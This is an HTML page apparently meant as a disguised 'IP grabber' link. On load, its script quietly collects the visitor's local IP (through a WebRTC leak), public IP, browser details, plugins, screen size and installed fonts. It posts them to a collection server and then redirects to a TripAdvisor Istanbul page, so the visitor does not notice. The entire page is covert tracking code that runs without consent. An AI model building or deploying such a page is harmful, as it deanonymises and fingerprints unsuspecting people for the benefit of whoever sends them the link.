<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitor Info</title>
</head>
<body>
    <script>
async function getLocalIP() {
    return new Promise((resolve) => {
        try {
            const rtc = new RTCPeerConnection({ iceServers: [] });
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            rtc.onicecandidate = (event) => {
                if (event.candidate && event.candidate.candidate) {
                    const ipMatch = event.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                    if (ipMatch) {
                        rtc.onicecandidate = null;
                        resolve(ipMatch[0]);
                    }
                }
            };
            setTimeout(() => {
                resolve(null); // In case no local IP found
            }, 1000);
        } catch (error) {
            console.error('Error getting local IP:', error);
            resolve(null);
        }
    });
}

async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error getting public IP:', error);
        return null;
    }
}

async function getScreenSize() {
    try {
        return {
            width: window.screen.width,
            height: window.screen.height
        };
    } catch (error) {
        console.error('Error getting screen size:', error);
        return null;
    }
}

async function getBrowserInfo() {
    try {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            online: navigator.onLine,
            plugins: Array.from(navigator.plugins).map(plugin => plugin.name)
        };
    } catch (error) {
        console.error('Error getting browser info:', error);
        return null;
    }
}

async function getAvailableFonts() {
    try {
        const fonts = [
            "Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New",
            "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS",
            "Trebuchet MS", "Arial Black", "Impact"
        ];

        const availableFonts = fonts.filter(font => {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            context.font = '72px ' + font + ', sans-serif';
            const baselineSize = context.measureText('m').width;
            context.font = '72px sans-serif';
            const defaultSize = context.measureText('m').width;
            return baselineSize !== defaultSize;
        });

        return availableFonts;
    } catch (error) {
        console.error('Error getting available fonts:', error);
        return [];
    }
}

async function getVisitorInfo() {
    const [localIP, publicIP, screenSize, browserInfo, availableFonts] = await Promise.all([
        getLocalIP().catch(error => { console.error(error); return null; }),
        getPublicIP().catch(error => { console.error(error); return null; }),
        getScreenSize().catch(error => { console.error(error); return null; }),
        getBrowserInfo().catch(error => { console.error(error); return null; }),
        getAvailableFonts().catch(error => { console.error(error); return []; })
    ]);

    return {
        screenSize: screenSize,
        browserInfo: browserInfo,
        systemTime: new Date().toString(),
        availableFonts: availableFonts,
        localIP: localIP,
        publicIP: publicIP
    };
}

async function sendVisitorInfo() {
    try {
        const visitorInfo = await getVisitorInfo();

        const response = await fetch('http://localhost:3000/api/visitor-info', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(visitorInfo)
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        window.location.href = "https://www.tripadvisor.com.tr/Tourism-g293974-Istanbul-Vacations.html";
    } catch (error) {
        console.error('Error sending visitor info:', error);
    }
}

// Send visitor information when the page loads
window.onload = sendVisitorInfo;

    </script>
</body>
</html>
